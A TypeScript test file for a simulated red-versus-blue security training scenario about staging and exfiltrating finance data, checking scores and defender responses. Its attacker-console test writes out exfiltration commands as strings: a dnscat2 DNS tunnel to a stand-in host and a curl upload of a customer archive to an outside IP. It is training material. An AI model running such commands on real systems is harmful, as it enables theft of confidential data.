import { describe, expect, it } from 'vitest';

import type { MatchMove, MatchSide, MatchState } from '@soc/shared';

import { MatchError } from '../../services/matchEngine.js';
import { maxTurnsFor, resolveMoveFor } from '../../services/matchContent.js';
import { EXFIL_NORTHWIND } from './exfil-northwind.js';

const { resolve, id } = EXFIL_NORTHWIND;
const WHY = 'stage the archive first, then trickle it out over DNS to stay quiet';

function move(side: MatchSide, optionId: string): MatchMove {
  return { seq: 0, side, turn: 1, optionId, justification: '', score: null, signal: null, at: 0 };
}

function stateWith(moves: MatchMove[]): MatchState {
  return {
    id: 'm',
    scenarioId: id,
    difficulty: 'expert',
    status: 'active',
    visibility: 'open',
    joinCode: null,
    hostUserId: 'h',
    red: { side: 'red', userId: 'r', identity: null },
    blue: { side: 'blue', userId: 'b', identity: null },
    toMove: 'red',
    turn: 1,
    maxTurns: 5,
    moves,
    findings: [],
    hostLog: [],
    terminalCwd: { red: '/home/student', blue: '/home/student' },
    createdAt: 0,
    lastMoveAt: null,
  };
}

const red = (state: MatchState, optionId: string, why = WHY) => resolve({ state, side: 'red', optionId, justification: why });
const blue = (state: MatchState, optionId: string, why = WHY) => resolve({ state, side: 'blue', optionId, justification: why });

const AFTER_STAGED = stateWith([move('red', 'stage-data')]);

describe('red: no exfil without staging', () => {
  it('fails a DNS exfil with nothing staged', () => {
    const r = red(stateWith([]), 'exfil-dns');
    expect(r.score.objectivePoints).toBe(1);
    expect(r.reveals?.[0]?.id).toBe('exfil-failed');
  });

  it('completes a quiet DNS exfil once the archive is staged', () => {
    const r = red(AFTER_STAGED, 'exfil-dns');
    expect(r.score.objectivePoints).toBe(10);
    expect(r.reveals?.some((f) => f.id === 'exfil-done-dns')).toBe(true);
  });

  it('completes a bulk exfil too, but scores lower for the egress spike', () => {
    const r = red(AFTER_STAGED, 'exfil-bulk');
    expect(r.score.objectivePoints).toBe(6);
    expect(r.hostLog?.some((l) => /4\.1 GB/.test(l))).toBe(true);
  });

  it('marks staging as a loud collection', () => {
    const r = red(stateWith([]), 'stage-data');
    expect(r.signal?.label).toMatch(/Bulk file collection/);
    expect(r.reveals?.[0]?.id).toBe('staged');
  });
});

describe('blue: catch it at the share or the wire', () => {
  const collect = stateWith([move('red', 'stage-data')]);
  const quietExfil = stateWith([move('red', 'stage-data'), move('red', 'exfil-dns')]);
  const loudExfil = stateWith([move('red', 'stage-data'), move('red', 'exfil-bulk')]);
  const quiet = stateWith([move('red', 'wait')]);

  it('quarantines the share during collection, not on silence', () => {
    expect(blue(collect, 'quarantine-share').score.objectivePoints).toBe(9);
    expect(blue(quiet, 'quarantine-share').score.objectivePoints).toBe(3);
  });

  it('blocks egress once data is on the wire, and overreacts on silence', () => {
    expect(blue(quietExfil, 'block-egress').score.objectivePoints).toBe(10);
    expect(blue(loudExfil, 'block-egress').score.objectivePoints).toBe(10);
    expect(blue(quiet, 'block-egress').score.objectivePoints).toBe(2);
  });

  it('watching egress catches the channel and surfaces evidence', () => {
    const r = blue(loudExfil, 'watch-egress');
    expect(r.score.objectivePoints).toBe(9);
    expect(r.reveals?.[0]?.id).toBe('ev-egress');
  });

  it('hunting DLP turns up the collection, and nothing on a quiet board', () => {
    expect(blue(collect, 'hunt-dlp').reveals?.[0]?.id).toBe('ev-collect');
    expect(blue(quiet, 'hunt-dlp').reveals ?? []).toHaveLength(0);
  });

  it('refuses a red move on the blue path', () => {
    expect(() => blue(collect, 'exfil-dns')).toThrow(MatchError);
  });
});

describe('attacker console', () => {
  const run = (cmd: string) => EXFIL_NORTHWIND.attacker!.run(cmd);

  it('maps the exfil chain to its actions', () => {
    expect(run('find //fileserver/finance -name *.csv').optionId).toBe('locate-data');
    expect(run('7z a customers.7z //fileserver/finance').optionId).toBe('stage-data');
    expect(run('dnscat2 --dns server=a1b2.example').optionId).toBe('exfil-dns');
    expect(run('curl -T customers.7z http://198.51.100.24/upload').optionId).toBe('exfil-bulk');
  });

  it('spends no turn on help or an unknown tool', () => {
    expect(run('help').optionId).toBeNull();
    expect(run('nano notes.txt').optionId).toBeNull();
  });
});

describe('registration', () => {
  it('is wired into the engine seam with its own turn budget', () => {
    const r = resolveMoveFor(id)({ state: AFTER_STAGED, side: 'red', optionId: 'exfil-dns', justification: WHY });
    expect(r.score.objectivePoints).toBe(10);
    expect(maxTurnsFor(id)).toBe(5);
  });
});
